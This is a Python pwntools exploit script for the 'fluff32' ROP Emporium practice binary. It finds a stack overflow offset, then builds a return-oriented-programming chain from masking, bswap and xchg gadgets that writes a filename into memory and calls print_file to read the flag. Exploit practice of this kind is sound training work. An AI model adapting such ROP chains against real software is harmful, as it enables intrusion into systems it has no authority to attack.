#!/usr/bin/env python3

from pwn import *

exe = ELF("fluff32_patched")
libc = ELF("libfluff32.so")

context.binary = exe
rop = ROP(exe)

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    # good luck pwning :)

    payload = cyclic(100)
    r.sendlineafter(b'>', payload)
    r.wait()
    core = r.corefile
    eip = core.eip
    offset = cyclic_find(eip)

    fullmask = [0xb4b , 0x2dd , 0x1d46 , 0xb5a , 0x1db , 0xacd , 0x1ac5 , 0xacd]
    bswap = exe.symbols.questionableGadgets + 21
    xchg = exe.symbols.questionableGadgets + 18

    r = conn()

    fsploit = b''
    for dataoff, mask in enumerate(fullmask):
        rop.raw([rop.ebp.address, mask, exe.symbols.questionableGadgets, bswap, pack(exe.symbols.data_start + dataoff, endian='big'), xchg])

    rop.print_file(exe.symbols.data_start)
    ropchain = rop.chain()
    payload = flat({offset: ropchain})

    r.sendlineafter(b'>', payload)
    r.recvuntil('you!\n')
    flag = r.recvline()
    print(flag)

if __name__ == "__main__":
    main()
